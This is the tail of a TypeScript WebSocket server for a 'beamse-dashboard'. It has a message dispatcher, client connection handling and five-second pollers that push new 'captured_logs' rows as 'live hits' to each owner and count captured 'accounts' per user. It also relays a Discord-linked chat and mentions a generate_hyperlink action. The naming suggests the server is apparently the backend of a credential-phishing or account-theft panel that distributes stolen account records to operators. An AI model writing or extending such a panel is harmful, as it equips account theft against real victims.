      return save_profile(ws, data || {}, client, request_id);
    case "save_group":
      return save_group(ws, data || {}, client, request_id);
    case "generate_hyperlink":
      return generate_hyperlink(ws, data || {}, client, request_id);
    case "refresh":
      return refresh(ws, data || {}, client, request_id);
    default:
      log(`Unknown message type: ${type}`, "info");
      send_msg(ws, type, { error: `Unknown message type: ${type}` }, request_id);
  }
}

// ============================================================================
// CONNECTION HANDLER
// ============================================================================
wss.on("connection", (ws: WebSocket, req: http.IncomingMessage) => {
  const client_id = Math.random().toString(36).slice(2, 11);
  const ip = String(req.headers["x-forwarded-for"] || req.socket.remoteAddress || "").split(",")[0].trim();
  const client = { id: client_id, authenticated: false, ip };
  clients.set(ws, client);
  log(`Client connected: ${client_id} (${ip})`, "info");

  ws.on("message", (raw: string) => {
    try {
      const message = JSON.parse(raw.toString());
      // Debug log all messages (except the noisy ones)
      if (message.type !== "get_dashboard" && message.type !== "get_chat" && message.type !== "get_live_hits") {
        log(`MSG [${client_id}] ${message.type} data_keys=${Object.keys(message.data || {}).join(",")}`, "info");
      }
      handle_message(ws, message, client).catch((err) => {
        log(`Message handler error for ${message.type}: ${err}`, "error");
      });
    } catch (err) {
      log(`Invalid message: ${err}`, "error");
    }
  });

  ws.on("close", () => {
    clients.delete(ws);
    log(`Client disconnected: ${client_id}`, "info");
  });

  ws.on("error", () => {
    clients.delete(ws);
  });
});

// ============================================================================
// BROADCAST: NEW LIVE HITS (poll captured_logs every 5s)
// ============================================================================
let last_hit_id = 0;
// Initialize last_hit_id from DB
pool.execute("SELECT MAX(id) as max_id FROM captured_logs").then(([rows]: any) => {
  last_hit_id = Number(rows[0]?.max_id || 0);
  log(`Initial last_hit_id: ${last_hit_id}`, "info");
}).catch(() => {});

setInterval(async () => {
  if (clients.size === 0) return;
  try {
    const [rows]: any = await pool.execute(
      "SELECT * FROM captured_logs WHERE id > ? ORDER BY id ASC",
      [last_hit_id],
    );
    if (Array.isArray(rows) && rows.length > 0) {
      for (const hit of rows) {
        last_hit_id = Math.max(last_hit_id, Number(hit.id));
        // Broadcast to the owner of this hit
        broadcast("new_live_hit", { hit }, (client) =>
          client.user && Number(client.user.id) === Number(hit.owner_id),
        );
        // Also update statistics
        try {
          await pool.execute(
            "UPDATE users SET statistics_accounts = statistics_accounts + 1, account_last_active = ? WHERE id = ?",
            [Math.floor(Date.now() / 1000), hit.owner_id],
          );
        } catch {}
      }
      // Broadcast stats update to all
      broadcast("stats_update", { timestamp: Date.now() });
    }
  } catch (err) {
    // Ignore polling errors
  }
}, 5000);

// ============================================================================
// BROADCAST: NEW CHAT MESSAGES (poll chat every 5s)
// ============================================================================
let last_chat_id = 0;
pool.execute("SELECT MAX(id) as max_id FROM chat").then(([rows]: any) => {
  last_chat_id = Number(rows[0]?.max_id || 0);
}).catch(() => {});

setInterval(async () => {
  if (clients.size === 0) return;
  try {
    const [rows]: any = await pool.execute(
      `SELECT c.id, c.user_id, c.message, c.created_at,
              u.discord_username, u.discord_avatar, u.discord_id
       FROM chat c
       JOIN users u ON c.user_id = u.id
       WHERE c.id > ?
       ORDER BY c.id ASC`,
      [last_chat_id],
    );
    if (Array.isArray(rows) && rows.length > 0) {
      for (const msg of rows) {
        last_chat_id = Math.max(last_chat_id, Number(msg.id));
        broadcast("new_chat_message", { message: msg });
      }
    }
  } catch (err) {
    // Ignore
  }
}, 5000);

// ============================================================================
// START SERVER
// ============================================================================
server.listen(setup.port, setup.host, () => {
  log(`beamse-dashboard running on http://${setup.host}:${setup.port}`, "ready");
  log(`WebSocket: ws://${setup.host}:${setup.port}/ws`, "ready");
  log(`HTTP API: http://${setup.host}:${setup.port}/api/auth/check`, "info");
});

server.on("error", (err: NodeJS.ErrnoException) => {
  if (err && (err.code === "EACCES" || err.code === "EADDRINUSE")) {
    log(`Port ${setup.port} unavailable: ${err.code}`, "error");
  } else {
    log(`Server error: ${err}`, "error");
  }
  process.exit(1);
});

// Export for testing
export { wss, pool };
